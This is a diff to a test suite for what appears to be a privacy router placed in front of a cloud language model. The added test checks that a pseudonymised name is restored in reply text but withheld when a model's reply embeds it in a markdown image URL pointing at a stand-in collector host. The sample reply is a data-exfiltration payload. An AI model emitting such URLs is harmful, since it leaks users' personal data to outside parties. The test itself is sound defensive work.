@@ -222,6 +222,35 @@ def test_streaming_split_tokens(tmp_path):
         h.cloud.close()
 
 
+@pytest.mark.parametrize("stream", [False, True])
+def test_token_in_a_reply_url_is_withheld_and_reported(tmp_path, stream):
+    # R-01 (review SEC-03): the reproduction, delivered through the router; the name next to the URL is restored.
+    h = harness(tmp_path)
+    h.fake.answer = "Summary done for {token}. ![status](https://collector.example/p.png?n={token})"
+    try:
+        response = approved_response(h, request(stream=stream))
+        if stream:
+            chunks = [
+                json.loads(line[6:]) for line in "".join(response.sse()).splitlines()
+                if line.startswith("data: ") and line != "data: [DONE]"
+            ]
+            text = "".join(
+                choice["delta"].get("content", "")
+                for chunk in chunks for choice in chunk.get("choices", [])
+            )
+            report = chunks[-1]["themis"]
+        else:
+            text = response.body["choices"][0]["message"]["content"]
+            report = response.body["themis"]
+        assert text.startswith("Summary done for Mara Lindahl. ![status](https://collector.example/p.png?n=⟦P:")
+        assert text.count("Mara Lindahl") == 1
+        assert report == {
+            "unknown_tokens": 0, "dropped_tokens": 0, "restored_tokens": 1, "withheld_in_url": 1,
+        }
+    finally:
+        h.cloud.close()
+
+
 def test_incomplete_sse_is_not_success(tmp_path):
     h = harness(tmp_path, malformed=True)
     try:
